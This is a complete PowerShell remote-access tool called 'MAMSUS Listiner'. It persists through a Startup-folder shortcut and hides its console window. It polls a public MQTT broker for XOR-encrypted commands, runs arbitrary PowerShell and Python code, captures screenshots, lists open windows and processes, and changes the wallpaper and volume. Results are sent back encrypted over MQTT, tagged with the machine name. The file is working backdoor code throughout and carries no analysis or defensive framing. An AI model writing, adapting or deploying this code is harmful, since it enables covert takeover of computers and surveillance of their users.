@"
                      ╓╗╗╗╗┐
             ╓╥╥╥╥╥╥║▒▒▒▒▒▒▒▒╢╥╖╥╖╖╓╓
           ╫║▒▒▒▒▒▒▒▒▒▒▒║░╙║▒▒▒▒▒▒╢▒▒▒╫~
         ╓║▒▒▒╙╙╙╙╜▒▒▒▒▒▒║╖ ╙║▒▒▒▒░╙║▒▒▒▒
       ╖║▒▒▒▒▒▒║@║@▒▒▒╢▒▒▒▒▒▒░║▒▒▒▒ '▒▒▒▒%H
    ╖▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╢╥└║▒▒▒▒ ╢╢▒▒▒╗∩▒▒▒▒▒▒▒╣╥
   ▒▒▒▒╝╙└ ╒╓▒░└╙╨▒▒▒▒▒▒▒╢▒▒▒╢▒▒╢▒▒▒║▒▒▒▒▒▒║▒▒▒
  ▌▒▒▒║╢║║▒▒▒▒▒▒║╢▒▒▒▒▒▒▒▒╢▒▒▒▒▒▒▒▒╜,╢▒▒▒╢╜▒▒▒▒
  ▌▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒╥╢▒▒▒▒  ║▒▒▒
 ╓║▒▒▒▒▒╨▒▒╓╓╓H▒▒▒▒▒▒╜╙   `"╜╢▒▒▒▒▒▒▒▒▒▒╜╓║▒▒▒▒╢	
 ]▒▒▒▒╜`╓║▒▒▒▒▒▒▒▒▒▒║' ,H%▒]   ╢▒▒╢▒▒▒║╜,║▒▒▒▒▒▒▒╢	MAMSUS Listiner
║▒▒║░┌╔▒▒▒▒▒▒▒▒▒▒▒▒▐  ▒▒┤║]╨H ]▒╢▒▒▒▒▒╢╢▒▒▒║╜░║▒▒▒	Version : 1.0
└▒▒▒▒▒▒▒▒║╜,╓▒▒▒▒▒▒▒  ╙[▒τ║╜  ║▒▒▒▒▒▒▒▒▒▒▒╜ ╓╢▒▒▒╚	Author: Alrifai Mohamad  
 └║▒▒▒▒▒╜╓╢╢▒▒▒▒▒▒▒▒╢,      ,▒▒▒▒▒▒▒║╝╝╝║▒╗║▒▒▒▒╜	GitHub: alrifaii
  [▒▒▒▒╜ ▒▒▒▒▒╝▒▒▒▒▒▒▒▒▒╢║╢▒▒▒▒▒▒▒▒╗H╗╗║▒▒▒▒▒▒▒H     
  ▌▒▒▒▒ ╓▒▒▒▒╨ ║▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒
  ╙▒▒▒▒▒▒▒▒▒▒╖▒▒▒▒▒▒╢▒▒▒▒▒▒▒▒▒▒▒╖░╙╢╜╜╜└`,▒╢▒▒▒
   ╙▒▒▒▒▒▒▒▒▒░║▒▒▒▒H]▒▒▒▒▒ ╢▒▒▒▒▒▒║║║║║║║▒▒▒▒▒*
      ╙╜▒▒▒▒▒  ▒▒▒▒║]▒▒▒▒▒▒╖╙╣▒▒▒▒▒▒▒▒▒▒▒▒╝╜
         ║▒▒▒║ ▒▒▒▒▒▒░╜║▒▒▒▒▒▒H╖, ╙╙▒▒▒▒╨
          ╙▒▒▒╢▒▒▒▒▒▒▒╖ └▒▒▒▒▒▒▒▒▒▒▒▒▒▒"
            ╙▒╜╜╜▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒▒░▒┘
                     ╙╜▒▒▒▒╜╜
"@
Set-ExecutionPolicy -Scope Process -ExecutionPolicy Bypass
$ScriptPath = $MyInvocation.MyCommand.Path
$ShortcutFilePath = [System.IO.Path]::Combine($env:APPDATA, 'Microsoft\Windows\Start Menu\Programs\Startup', 'MAMSUS.lnk')

if (-not (Test-Path $ShortcutFilePath)) {
    $WshShell = New-Object -ComObject WScript.Shell
    $Shortcut = $WshShell.CreateShortcut($ShortcutFilePath)
    $Shortcut.TargetPath = $ScriptPath
    $Shortcut.WorkingDirectory = (Get-Item $ScriptPath).Directory.FullName
    $Shortcut.IconLocation = $ScriptPath
    $Shortcut.Save()
    Write-Host "Shortcut created successfully" -ForegroundColor Green
} else {
    Write-Host "Shortcut already exists." -ForegroundColor Green
}


##arp
$libraries = @("paho-mqtt", "pyscreenshot", "Pillow", "pycaw", "pyautogui")

foreach ($library in $libraries) {
    try {
        $res = pip install $library 2>&1
        Write-Host "Installation result for $($library): $res"
    } catch {
        Write-Host "Error installing $($library): $_"
    }
}
Write-Host "Librarys Ready" -ForegroundColor Green

Add-Type -Name Window -Namespace Console -MemberDefinition '
[DllImport("Kernel32.dll")]
public static extern IntPtr GetConsoleWindow();

[DllImport("user32.dll")]
public static extern bool ShowWindow(IntPtr hWnd, Int32 nCmdShow);
'
function Hide-Console
{
    $consolePtr = [Console.Window]::GetConsoleWindow()
    #0 hide
    [Console.Window]::ShowWindow($consolePtr, 0)
}
Hide-Console



function Notificatio {
    param ([string]$message, [int]$optime)

$notification = @"

Add-Type -AssemblyName System.Windows.Forms

µnotificationForm = [System.Windows.Forms.Form]::new()
µnotificationForm.FormBorderStyle = [System.Windows.Forms.FormBorderStyle]::None
µnotificationForm.WindowState = [System.Windows.Forms.FormWindowState]::Normal
µnotificationForm.StartPosition = [System.Windows.Forms.FormStartPosition]::Manual
µnotificationForm.Left = µnotificationForm.Top = 0
µnotificationForm.Width = [System.Windows.Forms.Screen]::PrimaryScreen.WorkingArea.Width
µnotificationForm.Height = 50
µnotificationForm.BackColor = [System.Drawing.Color]::LightYellow
µnotificationForm.TopMost = µtrue

µlabel = [System.Windows.Forms.Label]::new()
µlabel.Text = '$message'
µlabel.TextAlign = [System.Drawing.ContentAlignment]::MiddleCenter
µlabel.Dock = [System.Windows.Forms.DockStyle]::Fill
µlabel.Font = [System.Drawing.Font]::new('Arial', 15)
µnotificationForm.Controls.Add(µlabel)
µnotificationForm.Show()

Start-Sleep -Seconds $optime

for (µopacity = 1.0; µopacity -ge 0.0; µopacity -= 0.02) {
    µnotificationForm.Opacity = µopacity
    Start-Sleep -Milliseconds 50
}

µnotificationForm.Close()


"@




try{
    $ps1ScriptPath = [System.IO.Path]::GetTempFileName() + ".ps1"
    $notification -replace "µ","$" | Set-Content -Path $ps1ScriptPath
    powershell -File $ps1ScriptPath
    }catch{Write-Host "Cant"}

}


function Wallpeap {
    param ([string]$urlhttp)

$walp = @"
µhtpurl = "$urlhttp"
µoutputPath = "C:\temp\test.jpg"
µdirectory = [System.IO.Path]::GetDirectoryName(µoutputPath)
if (-not (Test-Path µdirectory)) {
    New-Item -ItemType Directory -Path µdirectory | Out-Null
}
Invoke-WebRequest -Uri µhtpurl -OutFile µoutputPath

Function Set-WallPaper {
    param (
        [string]µImage,
        [ValidateSet('Fill', 'Fit', 'Stretch', 'Tile', 'Center', 'Span')]
        [string]µStyle = 'Fit'
    )

    µWallpaperStyle = @{
        'Fill' = 10
        'Fit' = 6
        'Stretch' = 2
        'Tile' = 0
        'Center' = 0
        'Span' = 22
    }[µStyle]

    µTileWallpaper = if (µStyle -eq 'Tile') { 1 } else { 0 }

    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name WallpaperStyle -Value $WallpaperStyle
    Set-ItemProperty -Path "HKCU:\Control Panel\Desktop" -Name TileWallpaper -Value $TileWallpaper
    Invoke-Expression -Command "rundll32.exe user32.dll, UpdatePerUserSystemParameters"
}

Set-WallPaper -Image µoutputPath


"@


try{
    $ps1ScriptPath = [System.IO.Path]::GetTempFileName() + ".ps1"
    $walp -replace "µ","$" | Set-Content -Path $ps1ScriptPath
    powershell -File $ps1ScriptPath
    }catch{Write-Host "Cant"}

}







function SETVOLUME {
    param (
        [string]$resultt
    )
    $pyvolume = @"
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

def set_volume(volume_level):
    devices = AudioUtilities.GetSpeakers()
    interface = devices.Activate(
        IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
    volume = cast(interface, POINTER(IAudioEndpointVolume))

    # volume level should be in the range [0.0, 1.0]
    volume.SetMasterVolumeLevelScalar(volume_level, None)

if __name__ == "__main__":
    # Set the volume level (replace 0.5 with the desired level)
    set_volume($resultt/100)
    
"@

    $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
    Write-Host $pythonScriptPath
    $pyvolume | Set-Content -Path $pythonScriptPath
    & python $pythonScriptPath
}


function psstring {
    param (
        [string]$keyyy,
        [string]$topicc
    )
$pysubs = @"
import paho.mqtt.client as mqtt
import socket

Key = '$keyyy'
def xor_encrypt(input_string, secret_key):
    encrypted = []
    for i, char in enumerate(input_string):
        encrypted_char = chr(ord(char) ^ ord(secret_key[i % len(secret_key)]))
        encrypted.append(encrypted_char)
    return ''.join(encrypted)

def xor_decrypt(encrypted_string, secret_key):
    return xor_encrypt(encrypted_string, secret_key)


def get_mqtt_message():    
    received_message = None
    def on_connect(client, userdata, flags, rc):
        client.subscribe('$topicc')
    def on_message(client, userdata, msg):
        nonlocal received_message
        message = xor_decrypt(msg.payload.decode(),Key)
        client.disconnect()
        received_message = message
    client = mqtt.Client()
    client.on_connect = on_connect
    client.on_message = on_message
    client.connect('broker.mqttdashboard.com', 1883, 60)
    client.loop_forever()
    return received_message

print(get_mqtt_message())
"@
Invoke-Expression "python -c `"$pysubs`""
}
$getprocessinfo =@"
µopenApps = Get-Process | Where-Object { µ_.MainWindowTitle -ne '' } | Select-Object MainWindowTitle, ProcessName;µmainWindowTitles = "";µprocessNames = "";foreach (µapp in µopenApps) {µmainWindowTitles += "µ(µapp.MainWindowTitle);";µprocessNames += "µ(µapp.ProcessName);"}Write-Host "µmainWindowTitles~µprocessNames"

"@

function SENDTOC {
    param (
        [string]$resultt,
        [string]$keyyy,
        [string]$topicc
    )

    $pypub = @"

import paho.mqtt.client as mqtt
import socket, sys
import time

Key = "$keyyy"
def xor_encrypt(input_string, secret_key):
    encrypted = []
    for i, char in enumerate(input_string):
        encrypted_char = chr(ord(char) ^ ord(secret_key[i % len(secret_key)]))
        encrypted.append(encrypted_char)
    return ''.join(encrypted)

def xor_decrypt(encrypted_string, secret_key):
    return xor_encrypt(encrypted_string, secret_key)

max_length = 14000

# Split the text into parts
def split_string(text, max_length):
    parts = []
    while len(text) > max_length:
        part = text[:max_length]
        parts.append(part)
        text = text[max_length:]
    if len(text) > 0:
        parts.append(text)
    return parts




def pub(nachricht):
    client = mqtt.Client("SADAF")
    msssg = socket.gethostname() + ": \n" + nachricht
    input_text = xor_encrypt(msssg,Key)
    text_parts = split_string(input_text, max_length)
    total_parts = len(text_parts)
    print(f"Total Parts: {total_parts}")
    for i, part in enumerate(text_parts):
        client.connect('broker.mqttdashboard.com', 1883)
        client.loop_start()
        print (part)
        client.publish('$topicc/response',part)
        print(f"Published Part {i + 1}")
        time.sleep(0.1)
        client.loop_stop()
        client.disconnect()

resullt = """
$resultt
"""
pub(resullt)
"@

$pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
Write-Host $pythonScriptPath
$pypub | Set-Content -Path $pythonScriptPath
& python $pythonScriptPath
}




$testsound = @"
[console]::beep(440,500)
[console]::beep(440,500)
[console]::beep(440,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,1000)
[console]::beep(659,500)
[console]::beep(659,500)
[console]::beep(659,500)
[console]::beep(698,350)
[console]::beep(523,150)
[console]::beep(415,500)
[console]::beep(349,350)
[console]::beep(523,150)
[console]::beep(440,1000)
"@

 
while ($true) {
    $pcname = (Get-Content Env:COMPUTERNAME)
    $plusdP = "${pcname}:" 
    $fileContent = Get-Content -Path ".\secret.key"
    $receivedMessage = psstring -keyyy $fileContent -topicc (Get-Content -Path ".\topic.key")
    if ($null -ne $receivedMessage) {
        $receivedMessage
        $msg = $receivedMessage -split "~"
        Write-Host "asd"
        $whatdevice = $msg[0]
        if ($receivedMessage -eq "!Whoareu"){
         $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
            $pypub | Set-Content -Path $pythonScriptPath
            $myname = "PS%($plusdP"
            $fileContent = Get-Content -Path ".\secret.key"
            $fileContenttopic = Get-Content -Path ".\topic.key"
            SENDTOC -resultt $myname -keyyy $fileContent -topicc $fileContenttopic
            Write-Host $myname
        }

        elseif($whatdevice -match "\b$Env:COMPUTERNAME\b"){
            Write-Host "my turn"
            if ($msg[1] -eq "False"){
                Notificatio -message $msg[2] -optime $msg[3]
            }
            if ($null -ne $msg[4]) { 
                if ($msg[5] -eq "ps"){
                    if ($msg[4] -eq "TestSound"){
                        Write-Host "Sound"
                        $ps1ScriptPath = [System.IO.Path]::GetTempFileName() + ".ps1"
                        $testsound | Set-Content -Path $ps1ScriptPath
                        powershell -File $ps1ScriptPath
                    }
                    elseif ($msg[4] -like "*Changepic*"){
                        Write-Host "walppppppp"
                        $wap = $msg[4]
                        $wurl = $wap -split " "
                        $wurl[1]
                        Wallpeap -urlhttp $wurl[1]
                    }
                    elseif ($msg[4] -like "whatprocess"){
                    try{
                    try{
                        $ps1ScriptPath = [System.IO.Path]::GetTempFileName() + ".ps1"
                        $seq = $getprocessinfo -replace "µ","$"
                        Write-Host $seq
                        }catch{Write-Host "Cant"}
                    $ps1ScriptPath = [System.IO.Path]::GetTempFileName() + ".ps1"
                    
                    $seq | Set-Content -Path $ps1ScriptPath
                    $res = powershell -File $ps1ScriptPath
                    Write-Host $res

                    $fileContent = Get-Content -Path ".\secret.key"
                    SENDTOC -resultt $res -keyyy $fileContent -topicc (Get-Content -Path ".\topic.key")
            
                }
                catch{
                    $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
                    $pypub | Set-Content -Path $pythonScriptPath
                    python $pythonScriptPath "Error"
                }

                        
                    } 
                    elseif ($msg[4] -like "*VOLU&ME*") {
                        $splitResult = $msg[4] -split " "
                        SETVOLUME -resultt $splitResult[1]

                    }

                    
                    else{ 
                    try{
                    try{
                        $ps1ScriptPath = [System.IO.Path]::GetTempFileName() + ".ps1"
                        $seq = $msg[4] -replace "µ","$"
                        Write-Host $seq
                        }catch{Write-Host "Cant"}
                    $ps1ScriptPath = [System.IO.Path]::GetTempFileName() + ".ps1"
                    
                    $seq | Set-Content -Path $ps1ScriptPath
                    $res = powershell -File $ps1ScriptPath
                    Write-Host $res
                    $fileContent = Get-Content -Path ".\secret.key"
                    SENDTOC -resultt $res -keyyy $fileContent -topicc (Get-Content -Path ".\topic.key")
                }
                catch{
                    $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
                    $pypub | Set-Content -Path $pythonScriptPath
                    python $pythonScriptPath "Error"
                }}}
                elseif ($msg[5] -eq "py") {
                    if ($msg[4] -eq "getscreen"){
                        Write-Host "Iam here"
                        try{
                            $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
                            $scrccc= @"
from pyscreenshot import grab
from io import BytesIO
from PIL import Image
import tempfile
screenshot = grab(bbox=(0, 0, 1920, 1080))
buffer = BytesIO()
screenshot.save(buffer, format="JPEG")
screenshot_bytes = buffer.getvalue()
original_string = screenshot_bytes.hex()
modified_string = original_string.replace('0', '%').replace('f', '&').replace('2', ')')
print(modified_string)
"@
                            $scrccc | Set-Content -Path $pythonScriptPath
                            Write-Host $pythonScriptPath
                            $erg = python $pythonScriptPath
                            Write-Host $erg
                            $fileContent = Get-Content -Path ".\secret.key"
                            SENDTOC -resultt "$erg" -keyyy $fileContent -topicc (Get-Content -Path ".\topic.key")
        
                        
                        }
                        catch{
                            $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
                            $pypub | Set-Content -Path $pythonScriptPath
                            python $pythonScriptPath "Error"
                        }
                    }else{
                    try{
                    $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
                    $msg[4] | Set-Content -Path $pythonScriptPath
                    Write-Host $pythonScriptPath
                    $erg = python $pythonScriptPath
                    $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
                    $pypub | Set-Content -Path $pythonScriptPath
                    python $pythonScriptPath $erg
                }
                catch{
                    $pythonScriptPath = [System.IO.Path]::GetTempFileName() + ".py"
                    $pypub | Set-Content -Path $pythonScriptPath
                    python $pythonScriptPath "Error"
                }

                }}
                else{Write-Host "Was willst du von mir"
                $msg[5]}
            }

    else{Write-Host "NOT MINES";$receivedMessage}
            
    }
}}
